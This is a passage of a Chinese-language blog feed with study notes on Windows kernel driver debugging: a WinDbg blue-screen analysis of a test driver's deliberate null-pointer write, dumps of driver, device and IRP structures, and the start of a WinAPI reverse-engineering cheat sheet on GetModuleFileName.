class=\"markdownIt-Anchor\" href=\"#蓝屏分析\">#</a> 蓝屏分析</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">analyze -v</span><br><span class=\"line\">kv   // 查看堆栈调用</span><br><span class=\"line\"></span><br><span class=\"line\">For analysis of this file, run !analyze -v</span><br><span class=\"line\">nt!RtlpBreakWithStatusInstruction:</span><br><span class=\"line\">83e85110 cc              int     3</span><br><span class=\"line\">0: kd&gt; !analyze -v</span><br><span class=\"line\">*******************************************************************************</span><br><span class=\"line\">*                                                                             *</span><br><span class=\"line\">*                        Bugcheck Analysis                                    *</span><br><span class=\"line\">*                                                                             *</span><br><span class=\"line\">*******************************************************************************</span><br><span class=\"line\"></span><br><span class=\"line\">SYSTEM_THREAD_EXCEPTION_NOT_HANDLED (7e)</span><br><span class=\"line\">This is a very common bugcheck.  Usually the exception address pinpoints</span><br><span class=\"line\">the driver/function that caused the problem.  Always note this address</span><br><span class=\"line\">as well as the link date of the driver/image that contains this address.</span><br><span class=\"line\">Arguments:</span><br><span class=\"line\">Arg1: c0000005, The exception code that was not handled</span><br><span class=\"line\">Arg2: 952fe02f, The address that the exception occurred at</span><br><span class=\"line\">Arg3: 8cb3490c, Exception Record Address</span><br><span class=\"line\">Arg4: 8cb34370, Context Record Address</span><br><span class=\"line\"></span><br><span class=\"line\">Debugging Details:</span><br><span class=\"line\">------------------</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Press ctrl-c (cdb, kd, ntsd) or ctrl-break (windbg) to abort symbol loads that take too long.</span><br><span class=\"line\">Run !sym noisy before .reload to track down problems loading symbols.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">KEY_VALUES_STRING: 1</span><br><span class=\"line\"></span><br><span class=\"line\">    Key  : AV.Dereference</span><br><span class=\"line\">    Value: NullPtr</span><br><span class=\"line\"></span><br><span class=\"line\">    Key  : AV.Fault</span><br><span class=\"line\">    Value: Write</span><br><span class=\"line\"></span><br><span class=\"line\">    Key  : Analysis.CPU.Sec</span><br><span class=\"line\">    Value: 0</span><br><span class=\"line\"></span><br><span class=\"line\">    Key  : Analysis.DebugAnalysisProvider.CPP</span><br><span class=\"line\">    Value: Create: 8007007e on DESKTOP-BEKKQKM</span><br><span class=\"line\"></span><br><span class=\"line\">    Key  : Analysis.DebugData</span><br><span class=\"line\">    Value: CreateObject</span><br><span class=\"line\"></span><br><span class=\"line\">    Key  : Analysis.DebugModel</span><br><span class=\"line\">    Value: CreateObject</span><br><span class=\"line\"></span><br><span class=\"line\">    Key  : Analysis.Elapsed.Sec</span><br><span class=\"line\">    Value: 17</span><br><span class=\"line\"></span><br><span class=\"line\">    Key  : Analysis.Memory.CommitPeak.Mb</span><br><span class=\"line\">    Value: 77</span><br><span class=\"line\"></span><br><span class=\"line\">    Key  : Analysis.System</span><br><span class=\"line\">    Value: CreateObject</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">BUGCHECK_CODE:  7e</span><br><span class=\"line\"></span><br><span class=\"line\">BUGCHECK_P1: ffffffffc0000005</span><br><span class=\"line\"></span><br><span class=\"line\">BUGCHECK_P2: ffffffff952fe02f</span><br><span class=\"line\"></span><br><span class=\"line\">BUGCHECK_P3: ffffffff8cb3490c</span><br><span class=\"line\"></span><br><span class=\"line\">BUGCHECK_P4: ffffffff8cb34370</span><br><span class=\"line\"></span><br><span class=\"line\">EXCEPTION_RECORD:  8cb3490c -- (.exr 0xffffffff8cb3490c)</span><br><span class=\"line\">ExceptionAddress: 952fe02f (MyDriver3!DriverEntry+0x0000000f)</span><br><span class=\"line\">   ExceptionCode: c0000005 (Access violation)</span><br><span class=\"line\">  ExceptionFlags: 00000000</span><br><span class=\"line\">NumberParameters: 2</span><br><span class=\"line\">   Parameter[0]: 00000001</span><br><span class=\"line\">   Parameter[1]: 00000000</span><br><span class=\"line\">Attempt to write to address 00000000</span><br><span class=\"line\"></span><br><span class=\"line\">CONTEXT:  8cb34370 -- (.cxr 0xffffffff8cb34370)</span><br><span class=\"line\">eax=00000000 ebx=00000000 ecx=bb40e64e edx=00000651 esi=868ac9a8 edi=866c2000</span><br><span class=\"line\">eip=952fe02f esp=8cb349d4 ebp=8cb349d8 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010206</span><br><span class=\"line\">MyDriver3!DriverEntry+0xf:</span><br><span class=\"line\">952fe02f c70050000000    mov     dword ptr [eax],50h  ds:0023:00000000=????????</span><br><span class=\"line\">Resetting default scope</span><br><span class=\"line\"></span><br><span class=\"line\">PROCESS_NAME:  System</span><br><span class=\"line\"></span><br><span class=\"line\">WRITE_ADDRESS:  00000000 </span><br><span class=\"line\"></span><br><span class=\"line\">ERROR_CODE: (NTSTATUS) 0xc0000005 - 0x%p            0x%p                    %s</span><br><span class=\"line\"></span><br><span class=\"line\">EXCEPTION_CODE_STR:  c0000005</span><br><span class=\"line\"></span><br><span class=\"line\">EXCEPTION_PARAMETER1:  00000001</span><br><span class=\"line\"></span><br><span class=\"line\">EXCEPTION_PARAMETER2:  00000000</span><br><span class=\"line\"></span><br><span class=\"line\">EXCEPTION_STR:  0xc0000005</span><br><span class=\"line\"></span><br><span class=\"line\">STACK_TEXT:  </span><br><span class=\"line\">8cb349d8 83fce2e6 868ac9a8 866c2000 00000000 MyDriver3!DriverEntry+0xf [C:\\Users\\Administrator\\source\\repos\\MyDriver3\\MyDriver3\\main.c @ 16] </span><br><span class=\"line\">8cb34bbc 83fd1d98 00000001 00000000 8cb34be4 nt!IopLoadDriver+0x7ed</span><br><span class=\"line\">8cb34c00 83e87aab 961f6bd0 00000000 86601020 nt!IopLoadUnloadDriver+0x70</span><br><span class=\"line\">8cb34c50 84013f5e 00000001 c9778f12 00000000 nt!ExpWorkerThread+0x10d</span><br><span class=\"line\">8cb34c90 83ebb219 83e8799e 00000001 00000000 nt!PspSystemThreadStartup+0x9e</span><br><span class=\"line\">00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x19</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">FAULTING_SOURCE_LINE:  C:\\Users\\Administrator\\source\\repos\\MyDriver3\\MyDriver3\\main.c</span><br><span class=\"line\"></span><br><span class=\"line\">FAULTING_SOURCE_FILE:  C:\\Users\\Administrator\\source\\repos\\MyDriver3\\MyDriver3\\main.c</span><br><span class=\"line\"></span><br><span class=\"line\">FAULTING_SOURCE_LINE_NUMBER:  16</span><br><span class=\"line\"></span><br><span class=\"line\">FAULTING_SOURCE_CODE:  </span><br><span class=\"line\">    12: &#123;</span><br><span class=\"line\">    13: \tDbgBreakPoint();</span><br><span class=\"line\">    14: </span><br><span class=\"line\">    15: \tint* x = 0;</span><br><span class=\"line\">&gt;   16: \t*x = 80;</span><br><span class=\"line\">    17: </span><br><span class=\"line\">    18: \tpDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class=\"line\">    19: \treturn STATUS_SUCCESS;</span><br><span class=\"line\">    20: &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">SYMBOL_NAME:  MyDriver3!DriverEntry+f</span><br><span class=\"line\"></span><br><span class=\"line\">IMAGE_NAME:  MyDriver3.sys</span><br><span class=\"line\"></span><br><span class=\"line\">MODULE_NAME: MyDriver3</span><br><span class=\"line\"></span><br><span class=\"line\">STACK_COMMAND:  .cxr 0xffffffff8cb34370 ; kb</span><br><span class=\"line\"></span><br><span class=\"line\">FAILURE_BUCKET_ID:  0x7E_MyDriver3!DriverEntry+f</span><br><span class=\"line\"></span><br><span class=\"line\">OS_VERSION:  7.1.7601.17514</span><br><span class=\"line\"></span><br><span class=\"line\">BUILDLAB_STR:  win7sp1_rtm</span><br><span class=\"line\"></span><br><span class=\"line\">OSPLATFORM_TYPE:  x86</span><br><span class=\"line\"></span><br><span class=\"line\">OSNAME:  Windows 7</span><br><span class=\"line\"></span><br><span class=\"line\">FAILURE_ID_HASH:  &#123;82a16a6f-d5b4-0708-1c67-c393a5a8a872&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Followup:     MachineOwner</span><br><span class=\"line\">---------</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; kv</span><br><span class=\"line\"> # ChildEBP RetAddr  Args to Child              </span><br><span class=\"line\">00 83f32b10 83e8510b 00000001 83e850dd 00000002 nt!RtlpBreakWithStatusInstruction (FPO: [1,0,0])</span><br><span class=\"line\">01 83f32b18 83e850dd 00000002 00000000 fffffffd nt!KdCheckForDebugBreak+0x22 (FPO: [0,0,0])</span><br><span class=\"line\">02 83f32b48 83e84f6b 83e81e1a bc788c41 00000000 nt!KeUpdateRunTime+0x164</span><br><span class=\"line\">03 83f32ba0 83e89c17 01da2802 01da2802 000000d1 nt!KeUpdateSystemTime+0x613</span><br><span class=\"line\">04 83f32ba0 83e81e1a 01da2802 01da2802 000000d1 nt!KeUpdateSystemTimeAssist+0x13 (FPO: [0,2] TrapFrame @ 83f32bb4)</span><br><span class=\"line\">05 83f32c24 00000000 0000000e 00000000 00000000 nt!KiIdleLoop+0x1a (FPO: [0,0,0])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">dump 文件在 配置路径下</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231206223053930.png\" alt=\"image-20231206223053930\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231206223751789.png\" alt=\"image-20231206223751789\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231206224032245.png\" alt=\"image-20231206224032245\"></p>\n<p>将 memory 拖到 windbg 分析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; dds esp </span><br><span class=\"line\">8cb34218  0000007e</span><br><span class=\"line\">8cb3421c  c0000005</span><br><span class=\"line\">8cb34220  952fe02f MyDriver3+0x102f</span><br><span class=\"line\">8cb34224  8cb3490c</span><br><span class=\"line\">8cb34228  8cb34370</span><br><span class=\"line\">8cb3422c  00000000</span><br><span class=\"line\">8cb34230  8cb34c90</span><br><span class=\"line\">8cb34234  84013f9e nt!RtlAnsiStringToUnicodeString+0x1dd</span><br><span class=\"line\">8cb34238  0000007e</span><br><span class=\"line\">8cb3423c  c0000005</span><br><span class=\"line\">8cb34240  952fe02f MyDriver3+0x102f</span><br><span class=\"line\">8cb34244  8cb3490c</span><br><span class=\"line\">8cb34248  8cb34370</span><br><span class=\"line\">8cb3424c  83e84494 nt!alloca_probe+0x130</span><br><span class=\"line\">8cb34250  00000000</span><br><span class=\"line\">8cb34254  8cb34c90</span><br><span class=\"line\">8cb34258  83e60d48 nt!NtBuildGUID+0xbcc4</span><br><span class=\"line\">8cb3425c  8cb34284</span><br><span class=\"line\">8cb34260  83ec9d5a nt!PsGetCurrentProcessSessionId+0x1a8</span><br><span class=\"line\">8cb34264  00000000</span><br><span class=\"line\">8cb34268  00000000</span><br><span class=\"line\">8cb3426c  00000000</span><br><span class=\"line\">8cb34270  8cb3490c</span><br><span class=\"line\">8cb34274  8cb34370</span><br><span class=\"line\">8cb34278  83e60d58 nt!NtBuildGUID+0xbcd4</span><br><span class=\"line\">8cb3427c  00000001</span><br><span class=\"line\">8cb34280  00e0a000</span><br><span class=\"line\">8cb34284  8cb342a8</span><br><span class=\"line\">8cb34288  83e82622 nt!KeReleaseInStackQueuedSpinLockFromDpcLevel+0x1e6</span><br><span class=\"line\">8cb3428c  fffffffe</span><br><span class=\"line\">8cb34290  8cb34c80</span><br><span class=\"line\">8cb34294  8cb34370</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">BUGCHECK_CODE:  7e</span><br><span class=\"line\">Bug Check 0x7E: SYSTEM_THREAD_EXCEPTION_NOT_HANDLED</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231209161413434.png\" alt=\"image-20231209161413434\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arguments:</span><br><span class=\"line\">Arg1: c0000005, The exception code that was not handled</span><br><span class=\"line\">Arg2: 952fe02f, The address that the exception occurred at</span><br><span class=\"line\">Arg3: 8cb3490c, Exception Record Address</span><br><span class=\"line\">Arg4: 8cb34370, Context Record Address</span><br><span class=\"line\"></span><br><span class=\"line\">// 代码蓝屏位置</span><br><span class=\"line\">MyDriver3+0x102f:</span><br><span class=\"line\">952fe02f c70050000000    mov     dword ptr [eax],50h  ds:0023:00000000=????????</span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; .trap TrapFrame</span><br><span class=\"line\">ESP EDITED! New esp=00000001</span><br><span class=\"line\">ErrCode = fffffffe</span><br><span class=\"line\">eax=00000001 ebx=badb0d00 ecx=83e4b3d8 edx=8cb34960 esi=952fe02f edi=8cb349d8</span><br><span class=\"line\">eip=83ead744 esp=8cb34980 ebp=00000651 iopl=0         nv up di pl nz na po nc</span><br><span class=\"line\">cs=0000  ss=0010  ds=0000  es=0095  fs=8d8a  gs=0000             efl=00000000</span><br><span class=\"line\">nt!RtlInitEnumerationHashTable+0xb17:</span><br><span class=\"line\">83ead744 c23400          ret     34h</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>内核线程栈 12k</p>\n<h3 id=\"驱动通信\"><a class=\"markdownIt-Anchor\" href=\"#驱动通信\">#</a> 驱动通信</h3>\n<p>一个 DRIVER_OBJECT 可以管理多个设备</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; dt _DRIVER_OBJECT</span><br><span class=\"line\">nt!_DRIVER_OBJECT</span><br><span class=\"line\">   +0x000 Type             : Int2B</span><br><span class=\"line\">   +0x002 Size             : Int2B</span><br><span class=\"line\">   +0x004 DeviceObject     : Ptr32 _DEVICE_OBJECT</span><br><span class=\"line\">   +0x008 Flags            : Uint4B</span><br><span class=\"line\">   +0x00c DriverStart      : Ptr32 Void</span><br><span class=\"line\">   +0x010 DriverSize       : Uint4B</span><br><span class=\"line\">   +0x014 DriverSection    : Ptr32 Void</span><br><span class=\"line\">   +0x018 DriverExtension  : Ptr32 _DRIVER_EXTENSION</span><br><span class=\"line\">   +0x01c DriverName       : _UNICODE_STRING</span><br><span class=\"line\">   +0x024 HardwareDatabase : Ptr32 _UNICODE_STRING</span><br><span class=\"line\">   +0x028 FastIoDispatch   : Ptr32 _FAST_IO_DISPATCH</span><br><span class=\"line\">   +0x02c DriverInit       : Ptr32     long </span><br><span class=\"line\">   +0x030 DriverStartIo    : Ptr32     void </span><br><span class=\"line\">   +0x034 DriverUnload     : Ptr32     void </span><br><span class=\"line\">   +0x038 MajorFunction    : [28] Ptr32     long </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; dt _DEVICE_OBJECT</span><br><span class=\"line\">nt!_DEVICE_OBJECT</span><br><span class=\"line\">   +0x000 Type             : Int2B</span><br><span class=\"line\">   +0x002 Size             : Uint2B</span><br><span class=\"line\">   +0x004 ReferenceCount   : Int4B</span><br><span class=\"line\">   +0x008 DriverObject     : Ptr32 _DRIVER_OBJECT</span><br><span class=\"line\">   +0x00c NextDevice       : Ptr32 _DEVICE_OBJECT</span><br><span class=\"line\">   +0x010 AttachedDevice   : Ptr32 _DEVICE_OBJECT</span><br><span class=\"line\">   +0x014 CurrentIrp       : Ptr32 _IRP</span><br><span class=\"line\">   +0x018 Timer            : Ptr32 _IO_TIMER</span><br><span class=\"line\">   +0x01c Flags            : Uint4B</span><br><span class=\"line\">   +0x020 Characteristics  : Uint4B</span><br><span class=\"line\">   +0x024 Vpb              : Ptr32 _VPB</span><br><span class=\"line\">   +0x028 DeviceExtension  : Ptr32 Void</span><br><span class=\"line\">   +0x02c DeviceType       : Uint4B</span><br><span class=\"line\">   +0x030 StackSize        : Char</span><br><span class=\"line\">   +0x034 Queue            : &lt;unnamed-tag&gt;</span><br><span class=\"line\">   +0x05c AlignmentRequirement : Uint4B</span><br><span class=\"line\">   +0x060 DeviceQueue      : _KDEVICE_QUEUE</span><br><span class=\"line\">   +0x074 Dpc              : _KDPC</span><br><span class=\"line\">   +0x094 ActiveThreadCount : Uint4B</span><br><span class=\"line\">   +0x098 SecurityDescriptor : Ptr32 Void</span><br><span class=\"line\">   +0x09c DeviceLock       : _KEVENT</span><br><span class=\"line\">   +0x0ac SectorSize       : Uint2B</span><br><span class=\"line\">   +0x0ae Spare1           : Uint2B</span><br><span class=\"line\">   +0x0b0 DeviceObjectExtension : Ptr32 _DEVOBJ_EXTENSION</span><br><span class=\"line\">   +0x0b4 Reserved         : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">PDO 物理设备</span><br><span class=\"line\">FDO filter device  io</span><br><span class=\"line\">附加设备：FDO 附加到 PDO</span><br><span class=\"line\">三环首先访问到FDO，经过多个FDO，访问到PDO 。PDO返回逐FDO返回</span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; dt _IRP</span><br><span class=\"line\">nt!_IRP</span><br><span class=\"line\">   +0x000 Type             : Int2B</span><br><span class=\"line\">   +0x002 Size             : Uint2B</span><br><span class=\"line\">   +0x004 MdlAddress       : Ptr32 _MDL</span><br><span class=\"line\">   +0x008 Flags            : Uint4B</span><br><span class=\"line\">   +0x00c AssociatedIrp    : &lt;unnamed-tag&gt;</span><br><span class=\"line\">   +0x010 ThreadListEntry  : _LIST_ENTRY</span><br><span class=\"line\">   +0x018 IoStatus         : _IO_STATUS_BLOCK</span><br><span class=\"line\">   +0x020 RequestorMode    : Char</span><br><span class=\"line\">   +0x021 PendingReturned  : UChar</span><br><span class=\"line\">   +0x022 StackCount       : Char\t\t\t// 设备栈层数</span><br><span class=\"line\">   +0x023 CurrentLocation  : Char\t\t\t// 设备栈索引</span><br><span class=\"line\">   +0x024 Cancel           : UChar</span><br><span class=\"line\">   +0x025 CancelIrql       : UChar</span><br><span class=\"line\">   +0x026 ApcEnvironment   : Char</span><br><span class=\"line\">   +0x027 AllocationFlags  : UChar</span><br><span class=\"line\">   +0x028 UserIosb         : Ptr32 _IO_STATUS_BLOCK</span><br><span class=\"line\">   +0x02c UserEvent        : Ptr32 _KEVENT</span><br><span class=\"line\">   +0x030 Overlay          : &lt;unnamed-tag&gt;</span><br><span class=\"line\">   +0x038 CancelRoutine    : Ptr32     void </span><br><span class=\"line\">   +0x03c UserBuffer       : Ptr32 Void</span><br><span class=\"line\">   +0x040 Tail             : &lt;unnamed-tag&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "逆向"
            ]
        },
        {
            "id": "http://example.com/2023/10/01/1234567/",
            "url": "http://example.com/2023/10/01/1234567/",
            "title": "windows逆向进阶",
            "date_published": "2023-10-01T05:38:45.000Z",
            "content_html": "<p><strong>暂停更新，未完结</strong></p>\n<h1 id=\"windows-逆向\"><a class=\"markdownIt-Anchor\" href=\"#windows-逆向\">#</a> Windows 逆向</h1>\n<h2 id=\"winapi速查表\"><a class=\"markdownIt-Anchor\" href=\"#winapi速查表\">#</a> WinApi 速查表</h2>\n<h3 id=\"getmodulefilename\"><a class=\"markdownIt-Anchor\" href=\"#getmodulefilename\">#</a> GetModuleFileName</h3>\n<p>获取当前进程已加载模块的文件的完整路径，该模块必须由当前进程加载。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DWORD GetModuleFileName(  </span><br><span class=\"line\">  HMODULE hModule,    // handle to module</span><br><span class=\"line\">  LPTSTR lpFilename,  // file name of module</span><br><span class=\"line\">  DWORD nSize         // size of buffer);</span><br><span class=\"line\"></span><br><span class=\"line\">00402016  |.  68 08020000       push    0x208                            ; /BufSize = 208 (520.)</span><br><span class=\"line\">0040201B  |.  33DB              xor     ebx,ebx                          ; |</span><br><span class=\"line\">0040201D  |.  50                push    eax                              ; |PathBuffer</span><br><span class=\"line\">0040201E  |.  53                push    ebx                              ; |hModule =&gt; NULL</span><br><span class=\"line\">0040201F  |.  FF15 8C804000     call    dword ptr ds:[&lt;&amp;KERNEL32.GetModu&gt;; \\GetModuleFileNameA</span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include 